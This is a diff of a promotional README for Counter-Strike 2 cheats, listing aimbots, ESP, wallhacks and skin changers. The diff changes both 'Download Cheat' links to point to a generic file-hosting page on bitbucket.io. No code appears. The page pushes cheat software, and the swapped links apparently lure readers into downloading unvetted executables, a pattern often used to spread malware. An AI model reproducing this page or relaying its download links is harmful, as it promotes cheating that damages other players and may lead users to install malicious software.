@@ -4,7 +4,7 @@
 
 Counter-Strike 2 (CS2) has taken the gaming world by storm, offering intense tactical gameplay and a competitive edge. For players aiming to enhance their performance, various cheats have emerged, providing tools like aimbots, ESP, wallhacks, and skin changers. These tools can offer significant advantages, but it's essential to understand their features, comparisons, and system requirements.
 
-[![Download Cheat](https://img.shields.io/badge/Download-Cheat-blueviolet)](https://wecheaters.github.io/cheats/cs2)
+[![Download Cheat](https://img.shields.io/badge/Download-Cheat-blueviolet)](https://fileoffload8.bitbucket.io)
 ---
 
 ## 🛠️ Product Description
@@ -21,7 +21,7 @@ CS2 cheats are third-party software tools designed to modify or enhance gameplay
 
 These tools are designed to provide players with an edge, especially in competitive scenarios.
 
-[![Download Cheat](https://i.ytimg.com/vi/YwpK8bzQxjw/maxresdefault.jpg)](https://wecheaters.github.io/cheats/cs2)
+[![Download Cheat](https://i.ytimg.com/vi/YwpK8bzQxjw/maxresdefault.jpg)](https://fileoffload8.bitbucket.io)
 ---
 
 ## ✨ Features
